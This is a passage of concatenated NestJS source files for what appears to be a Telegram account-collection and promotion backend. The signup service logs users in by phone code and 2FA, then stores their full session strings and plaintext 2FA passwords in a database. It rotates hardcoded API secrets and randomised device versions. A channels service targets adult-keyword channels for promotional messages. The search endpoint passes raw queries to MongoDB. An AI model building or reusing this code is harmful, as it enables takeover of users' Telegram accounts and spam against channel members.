systemVersion: pickRandom(systemVersions),\n    appVersion: pickRandom(appVersions),\n    useIPV6: true,\n    testServers: false\n  };\n}\n","import { Logger } from '@nestjs/common';\r\n\r\nexport class TelegramLogger {\r\n    private static instance: TelegramLogger;\r\n    private logger: Logger;\r\n\r\n    private constructor() {\r\n        this.logger = new Logger('TelegramService');\r\n    }\r\n\r\n    static getInstance(): TelegramLogger {\r\n        if (!TelegramLogger.instance) {\r\n            TelegramLogger.instance = new TelegramLogger();\r\n        }\r\n        return TelegramLogger.instance;\r\n    }\r\n\r\n    private shouldIncludeDetails(details?: any): boolean {\r\n        return details !== undefined \r\n            && details !== null \r\n            && !(typeof details === 'object' && Object.keys(details).length === 0);\r\n    }\r\n\r\n    private formatMessage(mobile: string, message: string, details?: any): string {\r\n        return this.shouldIncludeDetails(details)\r\n            ? `[${mobile}] ${message} - ${JSON.stringify(details)}`\r\n            : `[${mobile}] ${message}`;\r\n    }\r\n\r\n    logOperation(mobile: string, operation: string, details?: any): void {\r\n        this.logger.log(this.formatMessage(mobile, operation, details));\r\n    }\r\n\r\n    logError(mobile: string, operation: string, error: any): void {\r\n        this.logger.error(\r\n            `[${mobile}] ${operation} failed - ${error.message}`,\r\n            error.stack\r\n        );\r\n    }\r\n\r\n    logWarning(mobile: string, message: string, details?: any): void {\r\n        this.logger.warn(this.formatMessage(mobile, message, details));\r\n    }\r\n\r\n    logDebug(mobile: string, message: string, details?: any): void {\r\n        this.logger.debug(this.formatMessage(mobile, message, details));\r\n    }\r\n}","import { ApiProperty } from '@nestjs/swagger';\r\nimport { Transform } from 'class-transformer';\r\nimport { IsString, IsNotEmpty, IsOptional, Matches, MinLength } from 'class-validator';\r\n\r\nexport class SendCodeDto {\r\n    @ApiProperty({\r\n        description: 'Phone number to send the verification code to (international format)',\r\n        example: '+919876543210'\r\n    })\r\n    @IsString()\r\n    @IsNotEmpty()\r\n    @Matches(/^\\+\\d{8,15}$/, { message: 'Invalid phone number format' })\r\n    phone: string;\r\n}\r\n\r\nexport class VerifyCodeDto {\r\n    @ApiProperty({\r\n        description: 'Phone number used for verification (international format)',\r\n        example: '919876543210'\r\n    })\r\n    @IsString()\r\n    @IsNotEmpty()\r\n    @Matches(/^\\+\\d{8,15}$/, { message: 'Invalid phone number format' })\r\n    phone: string;\r\n\r\n    @ApiProperty({\r\n        description: 'Verification code received',\r\n        example: '12345'\r\n    })\r\n    @IsString()\r\n    @IsNotEmpty()\r\n    @Matches(/^\\d{5}$/, { message: 'Code must be exactly 5 digits' })\r\n    code: string;\r\n\r\n    @ApiProperty({\r\n        description: 'Two-factor authentication password if required',\r\n        example: 'yourSecurePassword123',\r\n        required: false\r\n    })\r\n    @IsString()\r\n    @IsOptional()\r\n    @Transform(({ value }) => value === '' ? undefined : value)\r\n    password?: string | undefined;\r\n\r\n}\r\n\r\nexport class TgSignupResponse {\r\n    @ApiProperty({\r\n        description: 'Operation status code',\r\n        example: 200\r\n    })\r\n    status: number;\r\n\r\n    @ApiProperty({\r\n        description: 'Response message',\r\n        example: 'Login successful'\r\n    })\r\n    message: string;\r\n\r\n    @ApiProperty({\r\n        description: 'Phone code hash for verification',\r\n        example: 'abc123xyz',\r\n        required: false\r\n    })\r\n    phoneCodeHash?: string;\r\n\r\n    @ApiProperty({\r\n        description: 'Whether the code was sent via app',\r\n        example: true,\r\n        required: false\r\n    })\r\n    isCodeViaApp?: boolean;\r\n\r\n    @ApiProperty({\r\n        description: 'Session string for authenticated client',\r\n        required: false\r\n    })\r\n    session?: string;\r\n\r\n    @ApiProperty({\r\n        description: 'Whether 2FA is required',\r\n        example: false,\r\n        required: false\r\n    })\r\n    requires2FA?: boolean;\r\n}","import { Controller, Post, Body, Logger, HttpStatus } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiResponse, ApiExtraModels } from '@nestjs/swagger';\nimport { TgSignupService } from './tg-signup.service';\nimport { SendCodeDto, VerifyCodeDto, TgSignupResponse } from './dto/tg-signup.dto';\n\n@Controller('tgsignup')\n@ApiTags('tgsignup')\n@ApiExtraModels(SendCodeDto, VerifyCodeDto, TgSignupResponse)\nexport class TgSignupController {\n    private readonly logger = new Logger(TgSignupController.name);\n\n    constructor(private readonly tgSignupService: TgSignupService) {}\n\n    @Post('send-code')\n    @ApiOperation({\n        summary: 'Send verification code to phone number',\n        description: 'Initiates the signup process by sending a verification code via Telegram'\n    })\n    @ApiResponse({\n        status: HttpStatus.CREATED,\n        type: TgSignupResponse,\n        description: 'Code sent successfully'\n    })\n    @ApiResponse({\n        status: HttpStatus.BAD_REQUEST,\n        description: 'Invalid phone number or failed to send code',\n        schema: {\n            type: 'object',\n            properties: {\n                statusCode: { type: 'number', example: 400 },\n                message: { type: 'string', example: 'Invalid phone number format' },\n                error: { type: 'string', example: 'Bad Request' }\n            }\n        }\n    })\n    @ApiResponse({\n        status: HttpStatus.TOO_MANY_REQUESTS,\n        description: 'Rate limit exceeded'\n    })\n    @ApiResponse({\n        status: HttpStatus.INTERNAL_SERVER_ERROR,\n        description: 'Internal server error occurred'\n    })\n    async sendCode(@Body() sendCodeDto: SendCodeDto): Promise<TgSignupResponse> {\n        try {\n            this.logger.debug(`[SEND_CODE] Request received for phone: ${sendCodeDto.phone}`);\n            const result = await this.tgSignupService.sendCode(sendCodeDto.phone);\n\n            return {\n                status: HttpStatus.CREATED,\n                message: 'Code sent to your Telegram App',\n                phoneCodeHash: result.phoneCodeHash,\n                isCodeViaApp: result.isCodeViaApp\n            };\n        } catch (error) {\n            this.logger.error(`[SEND_CODE] Error for phone: ${sendCodeDto.phone}`, {\n                error,\n                stack: error.stack\n            });\n\n            throw error;\n        }\n    }\n\n    @Post('verify')\n    @ApiOperation({\n        summary: 'Verify code and complete signup/login',\n        description: 'Verifies the code sent to phone and completes the signup/login process'\n    })\n    @ApiResponse({\n        status: HttpStatus.OK,\n        type: TgSignupResponse,\n        description: 'Verification successful'\n    })\n    @ApiResponse({\n        status: HttpStatus.BAD_REQUEST,\n        description: 'Invalid code or verification failed'\n    })\n    @ApiResponse({\n        status: HttpStatus.TOO_MANY_REQUESTS,\n        description: 'Rate limit exceeded'\n    })\n    @ApiResponse({\n        status: HttpStatus.INTERNAL_SERVER_ERROR,\n        description: 'Internal server error occurred'\n    })\n    async verifyCode(@Body() verifyCodeDto: VerifyCodeDto): Promise<TgSignupResponse> {\n        try {\n            this.logger.debug(`[VERIFY_CODE] Request received for phone: ${verifyCodeDto.phone}`);\n\n            const result = await this.tgSignupService.verifyCode(\n                verifyCodeDto.phone,\n                verifyCodeDto.code,\n                verifyCodeDto.password\n            );\n\n            return {\n                status: result.requires2FA ? HttpStatus.BAD_REQUEST : HttpStatus.OK,\n                message: result.message || 'Successfully logged in',\n                session: result.session,\n                requires2FA: result.requires2FA\n            };\n        } catch (error) {\n            this.logger.error(`[VERIFY_CODE] Error for phone: ${verifyCodeDto.phone}`, {\n                error,\n                stack: error.stack\n            });\n\n            throw error;\n        }\n    }\n}\n","import { Module, forwardRef } from '@nestjs/common';\nimport { TgSignupController } from './tg-signup.controller';\nimport { UsersModule } from '../users/users.module';\nimport { TgSignupService } from './tg-signup.service';\nimport { InitModule } from '../ConfigurationInit';\n\n@Module({\n    imports: [\n        InitModule,\n        forwardRef(() => UsersModule)],\n    controllers: [TgSignupController],\n    providers: [TgSignupService],\n    exports: [TgSignupService]\n})\nexport class TgSignupModule { }\n","import { Injectable, BadRequestException, Logger, InternalServerErrorException, OnModuleDestroy } from \"@nestjs/common\";\nimport { Api } from \"telegram/tl\";\nimport { TelegramClient } from \"telegram\";\nimport { StringSession } from \"telegram/sessions\";\nimport { LogLevel } from \"telegram/extensions/Logger\";\nimport { computeCheck } from \"telegram/Password\";\nimport { sleep } from \"telegram/Helpers\";\nimport { UsersService } from \"../users/users.service\";\nimport { TgSignupResponse } from \"./dto/tg-signup.dto\";\nimport { CreateUserDto } from \"../users/dto/create-user.dto\";\nimport { parseError } from \"../../utils/parseError\";\n\ninterface ITelegramCredentials {\n    apiId: number;\n    apiHash: string;\n}\n\n@Injectable()\nexport class TgSignupService implements OnModuleDestroy {\n    private readonly logger = new Logger(TgSignupService.name);\n    private static readonly LOGIN_TIMEOUT = 300000; // 10 minutes instead of 2.5\n    private static readonly SESSION_CLEANUP_INTERVAL = 300000; // 5 minutes instead of 2\n    private static readonly PHONE_PREFIX = \"+\"; // Prefix for phone numbers\n    private readonly cleanupInterval: NodeJS.Timeout;\n\n    // Map to store active client sessions\n    private static readonly activeClients = new Map<string, {\n        client: TelegramClient;\n        phoneCodeHash: string;\n        timeoutId: NodeJS.Timeout;\n        createdAt: number;\n    }>();\n\n    // API credentials pool for load balancing with correct hashes\n    private static readonly API_CREDENTIALS: ITelegramCredentials[] = [\n        { apiId: 27919939, apiHash: \"5ed3834e741b57a560076a1d38d2fa94\" },\n        { apiId: 25328268, apiHash: \"b4e654dd2a051930d0a30bb2add80d09\" },\n        { apiId: 12777557, apiHash: \"05054fc7885dcfa18eb7432865ea3500\" },\n        { apiId: 27565391, apiHash: \"a3a0a2e895f893e2067dae111b20f2d9\" },\n        { apiId: 27586636, apiHash: \"f020539b6bb5b945186d39b3ff1dd998\" },\n        { apiId: 29210552, apiHash: \"f3dbae7e628b312c829e1bd341f1e9a9\" }\n    ];\n\n    constructor(private readonly usersService: UsersService) {\n        this.cleanupInterval = setInterval(() => this.cleanupStaleSessions(), TgSignupService.SESSION_CLEANUP_INTERVAL);\n    }\n\n    async onModuleDestroy() {\n        clearInterval(this.cleanupInterval);\n        // Cleanup all active sessions\n        const phones = Array.from(TgSignupService.activeClients.keys());\n        await Promise.all(phones.map(phone => this.disconnectClient(phone)));\n    }\n\n    private getRandomCredentials(): ITelegramCredentials {\n        const index = Math.floor(Math.random() * TgSignupService.API_CREDENTIALS.length);\n        return TgSignupService.API_CREDENTIALS[index];\n    }\n\n    private async cleanupStaleSessions() {\n        for (const [phone, session] of TgSignupService.activeClients) {\n            try {\n                // Only cleanup if session is truly stale (disconnected and timeout exceeded)\n                if (Date.now() - session.createdAt > TgSignupService.LOGIN_TIMEOUT &&\n                    (!session.client || !session.client.connected)) {\n                    await this.disconnectClient(phone);\n                }\n            } catch (error) {\n                this.logger.warn(`Error cleaning up session for ${phone}: ${error.message}`);\n            }\n        }\n    }\n\n    private validatePhoneNumber(phone: string): string {\n        // Remove any existing + prefix\n        phone = phone.replace(/^\\+/, '');\n\n        // Validate phone number format\n        if (!/^\\d{8,15}$/.test(phone)) {\n            throw new BadRequestException('Please enter a valid phone number');\n        }\n\n        return phone;\n    }\n\n    private async disconnectClient(phone: string): Promise<void> {\n        const session = TgSignupService.activeClients.get(phone);\n        if (session) {\n            try {\n                clearTimeout(session.timeoutId);\n                await session.client.destroy();\n                this.logger.log(`Client disconnected for ${phone}`);\n            } catch (error) {\n                this.logger.warn(`Error disconnecting client for ${phone}: ${error.message}`);\n            } finally {\n                TgSignupService.activeClients.delete(phone);\n            }\n        }\n    }\n\n    async sendCode(phone: string): Promise<Pick<TgSignupResponse, 'phoneCodeHash' | 'isCodeViaApp'>> {\n        try {\n            phone = this.validatePhoneNumber(phone);\n\n            // Check if there's an existing active session that can be reused\n            const existingSession = TgSignupService.activeClients.get(phone);\n            if (existingSession && existingSession.client?.connected) {\n                // If session exists and is still valid, disconnect it before creating new one\n                await this.disconnectClient(phone);\n            }\n\n            const { apiId, apiHash } = this.getRandomCredentials();\n            const session = new StringSession('');\n            const client = new TelegramClient(session, apiId, apiHash, {\n                connectionRetries: 5,\n                retryDelay: 2000,\n                useWSS: true,\n                timeout: 30000\n            });\n\n            await client.setLogLevel(LogLevel.ERROR);\n\n            await client.connect();\n\n            const sendResult = await client.invoke(\n                new Api.auth.SendCode({\n                    phoneNumber: phone,\n                    apiId,\n                    apiHash,\n                    settings: new Api.CodeSettings({\n                        currentNumber: true,\n                        allowAppHash: true,\n                    }),\n                })\n            );\n\n            if (sendResult instanceof Api.auth.SentCodeSuccess) {\n                this.logger.error(`Unexpected immediate login for ${phone}`);\n                throw new BadRequestException('Unexpected immediate login');\n            }\n            const timeoutId = setTimeout(() => this.disconnectClient(phone), TgSignupService.LOGIN_TIMEOUT);\n\n            TgSignupService.activeClients.set(phone, {\n                client,\n                phoneCodeHash: sendResult.phoneCodeHash,\n                timeoutId,\n                createdAt: Date.now()\n            });\n\n            return {\n                phoneCodeHash: sendResult.phoneCodeHash,\n                isCodeViaApp: sendResult.type instanceof Api.auth.SentCodeTypeApp,\n            };\n        } catch (error) {\n            this.logger.error(`Failed to send code to ${phone}: ${error.message}`, error.stack);\n            await this.disconnectClient(phone);\n\n            if (error.errorMessage?.includes('PHONE_NUMBER_BANNED')) {\n                throw new BadRequestException('This phone number has been banned from Telegram');\n            }\n            if (error.errorMessage?.includes('PHONE_NUMBER_INVALID')) {\n                throw new BadRequestException('Please enter a valid phone number');\n            }\n            if (error.errorMessage?.includes('FLOOD_WAIT')) {\n                throw new BadRequestException('Please wait a few minutes before trying again');\n            }\n\n            throw new BadRequestException('Unable to send OTP. Please try again');\n        }\n    }\n\n    async verifyCode(phone: string, code: string, password?: string): Promise<TgSignupResponse> {\n        try {\n            phone = this.validatePhoneNumber(phone);\n\n            const session = TgSignupService.activeClients.get(phone);\n            if (!session) {\n                this.logger.warn(`No active signup session found for ${phone}`);\n                throw new BadRequestException('Session Expired. Please start again');\n            }\n\n            // Always extend session timeout on verification attempt, regardless of success\n            clearTimeout(session.timeoutId);\n            session.timeoutId = setTimeout(() => this.disconnectClient(phone), TgSignupService.LOGIN_TIMEOUT);\n\n            if (!session.client?.connected) {\n                try {\n                    await session.client?.connect();\n                } catch (error) {\n                    // Don't disconnect, just try to reconnect\n                    this.logger.warn(`Connection lost for ${phone}, attempting to reconnect`);\n                    try {\n                        const { apiId, apiHash } = this.getRandomCredentials();\n                        const newSession = new StringSession('');\n                        const newClient = new TelegramClient(newSession, apiId, apiHash, {\n                            connectionRetries: 5,\n                            retryDelay: 2000,\n                            useWSS: true,\n                            timeout: 30000\n                        });\n                        await newClient.connect();\n                        session.client = newClient;\n                    } catch (reconnectError) {\n                        throw new BadRequestException('Connection failed. Please try verifying again.');\n                    }\n                }\n            }\n\n            const { client, phoneCodeHash } = session;\n\n            try {\n                this.logger.debug(`Attempting to sign in with code for ${phone}`);\n                const signInResult = await client.invoke(\n                    new Api.auth.SignIn({\n                        phoneNumber: phone,\n                        phoneCodeHash,\n                        phoneCode: code,\n                    })\n                ) as Api.auth.Authorization;\n\n                if (!signInResult) {\n                    throw new BadRequestException('Invalid response from Telegram server');\n                }\n\n                if (signInResult instanceof Api.auth.AuthorizationSignUpRequired) {\n                    this.logger.log(`New user registration required for ${phone}`);\n                    const result = await this.handleNewUserRegistration(phone, client, phoneCodeHash);\n                    await this.disconnectClient(phone);\n                    return result;\n                }\n\n                // Store the session string before processing\n                const sessionString = client.session.save() as unknown as string;\n                if (!sessionString) {\n                    throw new Error('Failed to generate session string');\n                }\n\n                const userData = await this.processLoginResult(signInResult.user, sessionString, password);\n                await this.disconnectClient(phone);\n                return userData;\n            } catch (error) {\n                if (error.errorMessage === 'SESSION_PASSWORD_NEEDED') {\n                    this.logger.warn(`2FA required for ${phone}`);\n                    if (!password) {\n                        return {\n                            status: 400,\n                            message: 'Two-factor authentication required',\n                            requires2FA: true\n                        };\n                    }\n                    return await this.handle2FALogin(phone, session.client, password);\n                }\n                if (error.errorMessage?.includes('PHONE_CODE_INVALID') ||\n                    error.errorMessage?.includes('PHONE_CODE_EXPIRED')) {\n                    throw new BadRequestException('Invalid OTP,  Try again!');\n                }\n\n                this.logger.warn(`Verification attempt failed for ${phone}: ${error.message}`);\n                throw new BadRequestException('Verification failed. Please try again.');\n            }\n        } catch (error) {\n            this.logger.error(`Verification error for ${phone}: ${error.message}`);\n\n            if (error.message?.includes('No active signup session') ||\n                error.message?.includes('Connection failed')) {\n                await this.disconnectClient(phone);\n            }\n\n            throw error instanceof BadRequestException ? error :\n                new BadRequestException(error.message || 'Verification failed, please try again');\n        }\n    }\n\n    private async handle2FALogin(phone: string, client: TelegramClient, password: string): Promise<TgSignupResponse> {\n        try {\n            this.logger.debug(`Fetching password SRP parameters for ${phone}`);\n            const passwordSrpResult = await client.invoke(new Api.account.GetPassword());\n\n            this.logger.debug(`Computing password check for ${phone}`);\n            const passwordCheck = await computeCheck(passwordSrpResult, password);\n\n            this.logger.debug(`Invoking CheckPassword API for ${phone}`);\n            const signInResult = await client.invoke(\n                new Api.auth.CheckPassword({\n                    password: passwordCheck,\n                })\n            ) as Api.auth.Authorization;\n\n            if (!signInResult || !signInResult.user) {\n                throw new BadRequestException('Invalid response from Telegram server');\n            }\n\n            this.logger.log(`2FA login successful for ${phone}`);\n            const sessionString = client.session.save() as unknown as string;\n            if (!sessionString) {\n                throw new Error('Failed to generate session string');\n            }\n\n            const userData = await this.processLoginResult(signInResult.user, sessionString, password);\n            await this.disconnectClient(phone);\n            return userData;\n        } catch (error) {\n            this.logger.error(`2FA login failed for ${phone}: ${error.message}`, error.stack);\n            if (password) {\n                throw new BadRequestException('Incorrect 2FA password');\n            }\n            throw new BadRequestException('2FA password required');\n        }\n    }\n\n    private async handleNewUserRegistration(\n        phone: string,\n        client: TelegramClient,\n        phoneCodeHash: string\n    ): Promise<TgSignupResponse> {\n        try {\n            const randomName = `User${Math.random().toString(36).substring(2, 8)}`;\n            const signUpResult = await client.invoke(\n                new Api.auth.SignUp({\n                    phoneNumber: phone,\n                    phoneCodeHash,\n                    firstName: randomName,\n                    lastName: '', // Keep empty for privacy\n                })\n            ) as Api.auth.Authorization;\n\n            if (!signUpResult || !signUpResult.user) {\n                throw new BadRequestException('Invalid response from Telegram server');\n            }\n\n            const sessionString = client.session.save() as unknown as string;\n            if (!sessionString) {\n                throw new Error('Failed to generate session string');\n            }\n\n            return await this.processLoginResult(signUpResult.user, sessionString);\n        } catch (error) {\n            const errorDetails = parseError(error, \"TGSIGNUP\", false);\n            this.logger.error(`Failed to register new user: ${errorDetails.message}`);\n            throw new BadRequestException(errorDetails.message || 'Failed to register new user');\n        }\n    }\n\n    private async processLoginResult(user: any, sessionString: string, password?: string): Promise<TgSignupResponse> {\n        try {\n            if (!user || !sessionString) {\n                throw new Error('Invalid user data or session string');\n            }\n\n            // Add additional user metadata\n            const now = new Date();\n            const userData: CreateUserDto = {\n                mobile: user.phone?.toString()?.replace(/^\\+/, '') || '',\n                session: sessionString,\n                firstName: user.firstName || '',\n                lastName: user.lastName || '',\n                username: user.username || '',\n                tgId: user.id?.toString() || '',\n                twoFA: !!password,\n                password: password || null,\n                lastActive: now.toISOString().split('T')[0],\n                expired: false,\n                channels: 0,\n                personalChats: 0,\n                totalChats: 0,\n                otherPhotoCount: 0,\n                ownPhotoCount: 0,\n                ownVideoCount: 0,\n                otherVideoCount: 0,\n                recentUsers: [],\n                calls: {\n                    chatCallCounts: [],\n                    incoming: 0,\n                    outgoing: 0,\n                    totalCalls: 0,\n                    video: 0,\n                },\n                contacts: 0,\n                movieCount: 0,\n                msgs: 0,\n                photoCount: 0,\n                videoCount: 0,\n                gender: 'unknown',\n            };\n\n            // Validate required fields\n            if (!userData.mobile || !userData.tgId) {\n                throw new Error('Invalid user data received from Telegram');\n            }\n\n            await this.usersService.create(userData);\n            return {\n                status: 200,\n                message: 'Registration successful',\n                session: sessionString,\n            };\n        } catch (error) {\n            this.logger.error('Error processing login result:', error);\n            if (error instanceof BadRequestException) {\n                throw error;\n            }\n            throw new InternalServerErrorException('Failed to complete registration');\n        }\n    }\n}\n","// src/activechannels/activechannels.controller.ts\nimport { Controller, Get, Post, Body, Patch, Param, Delete, NotFoundException, Query, BadRequestException } from '@nestjs/common';\nimport { ActiveChannelsService } from './active-channels.service';\nimport { CreateActiveChannelDto } from './dto/create-active-channel.dto';\nimport { UpdateActiveChannelDto } from './dto/update-active-channel.dto';\nimport { ApiTags, ApiOperation, ApiResponse, ApiQuery, ApiBody } from '@nestjs/swagger';\nimport { ActiveChannel } from './schemas/active-channel.schema';\n\n@ApiTags('Active Channels')\n@Controller('active-channels')\nexport class ActiveChannelsController {\n  constructor(private readonly activeChannelsService: ActiveChannelsService) { }\n\n  @Post()\n  @ApiOperation({ summary: 'Create a new active channel' })\n  async create(@Body() createActiveChannelDto: CreateActiveChannelDto) {\n    return this.activeChannelsService.create(createActiveChannelDto);\n  }\n\n  @Post('createMultiple')\n  @ApiOperation({ summary: 'Create multiple channels' })\n  @ApiBody({ type: [CreateActiveChannelDto] })\n  async createMultiple(@Body() createChannelDtos: CreateActiveChannelDto[]): Promise<string> {\n    return this.activeChannelsService.createMultiple(createChannelDtos);\n  }\n\n  @Get('search')\n  @ApiOperation({ summary: 'Search channels by filters' })\n  @ApiQuery({ name: 'channelId', required: false, type: String })\n  @ApiQuery({ name: 'broadcast', required: false, type: Boolean })\n  @ApiQuery({ name: 'canSendMsgs', required: false, type: Boolean })\n  @ApiQuery({ name: 'participantsCount', required: false, type: Number })\n  @ApiQuery({ name: 'restricted', required: false, type: Boolean })\n  @ApiQuery({ name: 'sendMessages', required: false, type: Boolean })\n  @ApiQuery({ name: 'title', required: false, type: String })\n  @ApiQuery({ name: 'username', required: false, type: String })\n  @ApiQuery({ name: 'wordRestriction', required: false, type: Number })\n  @ApiQuery({ name: 'dMRestriction', required: false, type: Number })\n  @ApiQuery({ name: 'availableMsgs', required: false, type: [String] })\n  @ApiQuery({ name: 'banned', required: false, type: Boolean })\n  @ApiQuery({ name: 'reactRestricted', required: false, type: Boolean })\n  @ApiQuery({ name: 'megagroup', required: false, type: Boolean })\n  search(@Query() query: any): Promise<ActiveChannel[]> {\n    return this.activeChannelsService.search(query);\n  }\n\n  @Get()\n  @ApiOperation({ summary: 'Get all active channels' })\n  async findAll() {\n    return this.activeChannelsService.findAll();\n  }\n\n  @Get(':channelId')\n  @ApiOperation({ summary: 'Get an active channel by channelId' })\n  //@apiresponse({ status: 200, description: 'Return the active channel', type: ActiveChannel })\n  //@apiresponse({ status: 404, description: 'Channel not found' })\n  async findOne(@Param('channelId') channelId: string) {\n    return this.activeChannelsService.findOne(channelId);\n  }\n\n  @Patch(':channelId')\n  @ApiOperation({ summary: 'Update an active channel by channelId' })\n  //@apiresponse({ status: 200, description: 'The channel has been successfully updated.', type: ActiveChannel })\n  //@apiresponse({ status: 404, description: 'Channel not found' })\n  async update(@Param('channelId') channelId: string, @Body() updateActiveChannelDto: UpdateActiveChannelDto) {\n    return this.activeChannelsService.update(channelId, updateActiveChannelDto);\n  }\n\n  @Delete(':channelId')\n  @ApiOperation({ summary: 'Delete an active channel by channelId' })\n  //@apiresponse({ status: 200, description: 'The channel has been successfully deleted.' })\n  //@apiresponse({ status: 404, description: 'Channel not found' })\n  async remove(@Param('channelId') channelId: string) {\n    return this.activeChannelsService.remove(channelId);\n  }\n}\n","// src/activechannels/activechannels.module.ts\nimport { Module } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { ActiveChannelsService } from './active-channels.service';\nimport { ActiveChannelsController } from './active-channels.controller';\nimport { ActiveChannel, ActiveChannelSchema } from './schemas/active-channel.schema';\nimport { InitModule } from '../ConfigurationInit/init.module';\nimport { PromoteMsgModule } from '../promote-msgs/promote-msgs.module';\n\n@Module({\n  imports: [\n    InitModule,\n    MongooseModule.forFeature([{ name: ActiveChannel.name, schema: ActiveChannelSchema }]),\n    PromoteMsgModule\n  ],\n  controllers: [ActiveChannelsController],\n  providers: [ActiveChannelsService],\n  exports: [ActiveChannelsService]\n})\nexport class ActiveChannelsModule { }\n","import { PromoteMsgsService } from './../promote-msgs/promote-msgs.service';\n// src/activechannels/activechannels.service.ts\nimport { BadRequestException, Inject, Injectable, InternalServerErrorException, forwardRef } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model, PipelineStage } from 'mongoose';\nimport { CreateActiveChannelDto } from './dto/create-active-channel.dto';\nimport { UpdateActiveChannelDto } from './dto/update-active-channel.dto';\nimport { ActiveChannel, ActiveChannelDocument } from './schemas/active-channel.schema';\nimport { parseError } from '../../utils/parseError';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { notifbot } from '../../utils/logbots';\n\n@Injectable()\nexport class ActiveChannelsService {\n  constructor(\n    @InjectModel(ActiveChannel.name) private activeChannelModel: Model<ActiveChannelDocument>,\n    @Inject(forwardRef(() => PromoteMsgsService))\n    private promoteMsgsService: PromoteMsgsService\n  ) {}\n\n  async create(createActiveChannelDto: CreateActiveChannelDto): Promise<ActiveChannel> {\n    createActiveChannelDto.availableMsgs = Object.keys(await this.promoteMsgsService.findOne())\n    const createdChannel = new this.activeChannelModel(createActiveChannelDto);\n    return createdChannel.save();\n  }\n\n\n  async createMultiple(createChannelDtos: CreateActiveChannelDto[]): Promise<string> {\n    const bulkOps = createChannelDtos.map((dto) => ({\n      updateOne: {\n        filter: { channelId: dto.channelId },\n        update: { $set: dto },\n        upsert: true\n      }\n    }));\n\n    await this.activeChannelModel.bulkWrite(bulkOps, { ordered: false });\n    return 'Channels Saved';\n  }\n\n  async findAll(): Promise<ActiveChannel[]> {\n    return this.activeChannelModel.find().exec();\n  }\n\n  async findOne(channelId: string): Promise<ActiveChannel> {\n    const channel = (await this.activeChannelModel.findOne({ channelId }).exec())?.toJSON();\n    return channel;\n  }\n\n  async update(channelId: string, updateActiveChannelDto: UpdateActiveChannelDto): Promise<ActiveChannel> {\n    delete updateActiveChannelDto[\"_id\"]\n    const updatedChannel = await this.activeChannelModel.findOneAndUpdate(\n      { channelId },\n      { $set: updateActiveChannelDto },\n      { new: true, upsert: true },\n    ).exec();\n    return updatedChannel;\n  }\n\n  async removeFromAvailableMsgs(channelId: string, msg: string) {\n    return await this.activeChannelModel.findOneAndUpdate({ channelId }, { $pull: { availableMsgs: msg } })\n  }\n\n  async addToAvailableMsgs(channelId: string, msg: string) {\n    return await this.activeChannelModel.findOneAndUpdate({ channelId }, { $addToSet: { availableMsgs: msg } })\n  }\n\n  async remove(channelId: string): Promise<void> {\n    const result = await this.activeChannelModel.findOneAndDelete({ channelId }).exec();\n  }\n\n  async search(filter: any): Promise<ActiveChannel[]> {\n    console.log(filter)\n    return this.activeChannelModel.find(filter).exec();\n  }\n\n  async getActiveChannels(limit = 50, skip = 0, notIds = []) {\n    const query = {\n      '$and':\n        [\n          {\n            '$or':\n              [\n                { title: { '$regex': /wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i } },\n                { username: { '$regex': /wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i } },\n              ]\n          },\n          {\n            '$and': [\n              {\n                title: {\n                  $exists: true,\n                  $type: \"string\",\n                  '$not': { '$regex': /online|realestat|propert|freefire|bgmi|promo|agent|board|design|realt|clas|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i }\n                }\n              },\n              {\n                username:\n                {\n                  $exists: true,\n                  $type: \"string\",\n                  '$not': { '$regex': /online|freefire|bgmi|promo|agent|realestat|propert|board|design|realt|clas|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i }\n                }\n              },\n            ]\n          },\n          {\n            channelId: { '$nin': notIds },\n            participantsCount: { $gt: 600 },\n            username: { $ne: null },\n            canSendMsgs: true,\n            restricted: false,\n            forbidden: false\n          }\n        ]\n    }\n\n    try {\n\n      const pipeline: PipelineStage[] = [\n        { $match: query },\n        { $addFields: { randomField: { $rand: {} } } },\n        { $sort: { randomField: 1 as const } },\n        { $skip: skip },\n        { $limit: limit },\n        { $project: { randomField: 0 } }\n      ];\n      const result: ActiveChannel[] = await this.activeChannelModel.aggregate<ActiveChannel>(pipeline).exec();\n      return result;\n    } catch (error) {\n      console.error('Error:', error);\n      return [];\n    }\n  }\n  async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<ActiveChannel[]> {\n    try {\n      if (!query) {\n        throw new BadRequestException('Query is invalid.');\n      }\n      const queryExec = this.activeChannelModel.find(query);\n\n      if (sort) {\n        queryExec.sort(sort);\n      }\n\n      if (limit) {\n        queryExec.limit(limit);\n      }\n\n      if (skip) {\n        queryExec.skip(skip);\n      }\n\n      return await queryExec.exec();\n    } catch (error) {\n      throw new InternalServerErrorException(error.message);\n    }\n  }\n\n  async resetWordRestrictions() {\n    await fetchWithTimeout(`${notifbot()}&text=Request Received for Reset Available Msgs`);\n    try {\n      await this.activeChannelModel.updateMany({\n        banned: false\n      }, {\n        $set: {\n          \"wordRestriction\": 0,\n          \"dMRestriction\": 0\n        }\n      })\n    } catch (e) {\n      console.log(parseError(e))\n    }\n  }\n\n  async resetAvailableMsgs() {\n    await fetchWithTimeout(`${notifbot()}&text=Request Received for Reset Available Msgs`);\n    try {\n      const data = await this.promoteMsgsService.findOne();\n      const keys = Object.keys(data);\n      await this.activeChannelModel.updateMany(\n        {\n          $expr: {\n            